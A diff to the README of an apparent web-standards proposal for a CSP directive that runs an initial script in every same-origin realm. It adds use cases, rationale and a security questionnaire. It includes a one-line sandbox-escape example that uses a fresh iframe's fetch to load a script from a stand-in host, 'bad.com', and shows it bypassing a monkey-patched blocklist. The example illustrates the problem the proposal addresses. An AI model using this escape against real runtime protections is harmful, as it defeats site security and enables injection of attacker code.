@@ -29,8 +29,10 @@ document.body.appendChild(iframe);
 * [Proposal](#Proposal)
 * [Example](#Example)
 * [Use Cases](#Use-Cases)
+* [Value](#Value)
 * [Discussion](#Discussion)
 * [Considerations](#Considerations)
+* [Self-Review Questionnaire: Security and Privacy](#self-review-questionnaire-security-and-privacy)
 * [Terminology](#Terminology)
 * [Resources](#Resources)
 
@@ -216,7 +218,69 @@ newFetchInstance(`https://${server}/${path}/?payload=` + payload)
 
 ## Use Cases
 
-> *Adding use cases is a WIP - if you find this proposal useful (or just want to explore some potential use cases), help by visiting [#4](https://github.com/weizman/Realms-Initialization-Control/issues/4) and share your use case to push this proposal forward!*
+Here are some use cases introduced by the community which led to the composition of this proposal.
+
+### Safe composability (sandboxing / confinement)
+
+The ability to safely embed untrusted code in a safe way is important for composability. Platforms can use it to allow their users as well as third party providers to enhance their provided functionality, and provide value to end users.
+
+While the web platform allows such safe embedding through cross-origin iframes or workers, there are cases where same-origin untrusted-code embedding is required. E.g., in cases where the untrusted code may not be custom tailored to a sandboxed environment.
+In such cases, in order to guarantee the end user's security, platforms will constrain the capabilities that are available to the untrusted code by overriding native prototypes.
+
+At the same time, it's hard to ensure that the overriding scripts are first to run in the embedded contexts, and determined attackers can use that to escape the sandbox under certain conditions. See the same origin concern for more details on that.
+
+This proposal aims to solve this, by enabling the top-level document to guarantee running an initial script in every new same-origin realm, and prevent races that allow for sandbox escapes.
+
+### Application Monitoring (security / errors / performance / ux)
+
+Many application monitoring services rely on overriding ("monkey patching") Javascript and DOM APIs in order to know and control when and how they are called.
+
+This is done to measure these API's performance or to use those API calls to inform other performance measurements, detect runtime errors, or to inspect how apps are being used in order to enhance their UX.
+
+In other cases, the same methods are used to apply runtime security. The security aspect is particularly sensitive to the timing in which the API override happens.
+
+While missed overrides are not-ideal for other use cases, when used for security enforcement, attackers can leverage such ungoverned same origin realms to escape applied runtime security.
+
+To stress this even more, virtualizing the behaviour of JavaScript APIs to monitor/mitigate/block what malicious JavaScript code can do, such as by redefining the behaviour of `fetch`:
+
+```javascript
+const realFetch = window.fetch;
+window.fetch = function(url, ...args) {
+   if (url.includes('bad.com')) {
+      throw new Error('BLOCKED');
+   }
+   return realFetch(url, ...args);
+}
+```
+
+is effectively meaningless as long as attackers can bypass this by escaping into ungoverned same origin realms (which this proposal aims to address):
+
+```javascript
+document.body.appendChild(document.createElement('iframe')).contentWindow.fetch('//bad.com/bad.js');
+```
+
+The conclusion is that not being able to enforce such services at a very specific time (earlier than all other scripts) to all same origin realms of the app (as opposed to its top most realm only), significantly narrows down the reach such services have, which attackers can abuse.
+
+## Value
+
+While this feature is developers facing, the value it aspires to introduce is for the end users really, because until this proposal lands, the same origin concern prevents developers from building safe composable web applications within their own origin and instead place untrusted code within cross origin realms which affects the end user in 2 major ways:
+
+### User Experience
+
+The feature aims to enable developers to provide better user experiences when embedding untrusted code into their applications.
+
+Currently when embedding untrusted code, developers are using cross-origin iframes or workers for that purpose, which often creates separate experiences from their own content.
+
+While developers can restrict their own documents (by overriding various JS functions and DOM APIs), attackers can use same-origin realms to regain access to these prototypes.
+
+This proposal enables developers to prevent attackers from regaining access to native prototypes, and hence embed untrusted code into their documents in a safe way. This provides users with richer and more coherent embedded experiences on the web.
+
+### Improved Composability
+
+Not only this will allow to do things apps do today better, but this will also allow developers to introduce composability capabilities that aren't currently possible.
+
+Not being able to secure the origin of the app against untrusted code really limits developers to inferior solutions that require making use of cross origin realms, which effectively limits how far the power of composability can really go.
+Allowing such untrusted code to run in the origin of the app can allow it for example to freely interact with the DOM of the app, which isn't possible when embedded in a cross origin document, and when combined with this proposal, such interaction can be mitigated by the hosting app in a finally secure way. Since this example can be easily extended to many other use cases, it might become clear how such a proposal can unlock new power for web apps in the realm of secure composability and embedding of untrusted code.
 
 ## Discussion
 
@@ -235,6 +299,26 @@ The browser will load the script defined by the new CSP directive of the top mai
 Meaning, the top main realm is the only realm in a webpage with the power to set the new CSP directive, and it must trickle down to child realms from the same origin, as they don't have the power to set this directive.
 
 This already goes with how CSP is currently enforcing its rules canonically in the lifetime of a webpage. 
+
+### Enforcing multiple policies
+
+According to the [W3C CSP spec (enforcing-multiple-policies)](https://www.w3.org/TR/CSP2/#enforcing-multiple-policies), the browser must have a consistent mechanizm for handling multiple CSPs (e.g. 2 setting headers).
+
+Regarding this proposal, since the proposed directive is designed to support an unlimited amount of remote script resources to be loaded chronologically, the natural way to address this would be to accumulate resources into a chronological list.
+
+So:
+```
+Content-Security-Policy: realm-init /x.js
+Content-Security-Policy: realm-init /y.js
+```
+
+Will fuse into:
+
+```
+Content-Security-Policy: realm-init /x.js /y.js
+```
+
+And will execute the scripts in that order.
 
 ### Comparison with `X-frames` and `frame-src`
 
@@ -288,6 +372,94 @@ In that context, it might be worth reflecting possible alternatives and their pr
 When implementing this proposal, it is crucial to correctly instruct the browser to make sure the script provided via the `init-realm` CSP directive is the first JavaScript code to run within the realm, as in before any scripts dictated to run by its associated document (and to repeat that to all nested same origin realms).
 
 Otherwise, a malicious entity can find a way to introduce their own JavaScript code to run before the `init-realm` script, which would count as a complete bypass of this feature effectively which would miss the goal entirely.
+
+## [Self-Review Questionnaire: Security and Privacy](https://w3ctag.github.io/security-questionnaire/)
+
+> 01.  What information does this feature expose, and for what purposes?
+
+This feature allows a website to register JavaScript code to be executed within new realms that fall under its jurisdiction (same origin) before any other JavaScript code gets to run within them.
+Thus, the information it naturally exposes is regarding when a new same origin realm is introudced under the execution environment of the top realm of the website.
+
+> 02.  Do features in your specification expose the minimum amount of information necessary to implement the intended functionality?
+
+Yes, I believe so - no further information is being provided to the website other than what's described under Q#1
+
+> 03.  Do the features in your specification expose personal information, personally-identifiable information (PII), or information derived from either?
+
+No
+
+> 04.  How do the features in your specification deal with sensitive information?
+
+They have nothing to do with such information
+
+> 05.  Does data exposed by your specification carry related but distinct information that may not be obvious to users?
+
+The only distinct information that's being provided to the user that was not possible before is when same origin realms are introduced into the website's execution environment
+
+> 06.  Do the features in your specification introduce state that persists across browsing sessions?
+
+No
+
+> 07.  Do the features in your specification expose information about the underlying platform to origins?
+
+No
+
+> 08.  Does this specification allow an origin to send data to the underlying platform?
+
+No
+
+> 09.  Do features in this specification enable access to device sensors?
+
+No
+
+> 10.  Do features in this specification enable new script execution/loading mechanisms?
+
+Yes, this feature focuses on allowing a website to register JavaScript code to be loaded within new realms when are introduced into the execution environment of the website at runtime.
+While the browser somewhat knows already how to load JavaScript code within new realms with features such as web extensions' `content_script:run_at`, granting such power to websites (rather than extensions) is necessarily new.
+
+> 11.  Do features in this specification allow an origin to access other devices?
+
+No
+
+> 12.  Do features in this specification allow an origin some measure of control over a user agent's native UI?
+
+No
+
+> 13.  What temporary identifiers do the features in this specification create or expose to the web?
+
+None
+
+> 14.  How does this specification distinguish between behavior in first-party and third-party contexts?
+
+This feature enables sites to run a remote JavaScript file in the context of new same-origin realms, and only such realms. As same-origin is stricter than same-site, the distinction between first-party and third-party contexts falls out of that restriction.
+
+> 15.  How do the features in this specification work in the context of a browser’s Private Browsing or Incognito mode?
+
+Behaves the same in both modes
+
+> 16.  Does this specification have both "Security Considerations" and "Privacy Considerations" sections?
+
+Both sections can be found under the [Consideration](#Consideration) section in this document, which will later be integrated into the proposed spec as well.
+
+> 17.  Do features in your specification enable origins to downgrade default security protections?
+
+No
+
+> 18.  What happens when a document that uses your feature is kept alive in BFCache (instead of getting destroyed) after navigation, and potentially gets reused on future navigations back to the document?
+
+N/a
+
+> 19.  What happens when a document that uses your feature gets disconnected?
+
+My feature takes place (start to finish) synchronously when the document is introduced to the environment, meaning that if disconnection takes place, it does so after my feature is done necessarily.
+
+> 20.  Does your feature allow sites to learn about the users use of assistive technology?
+
+No
+
+> 21.  What should this questionnaire have asked?
+
+Nothing that comes to mind atm
 
 ## Terminology
 
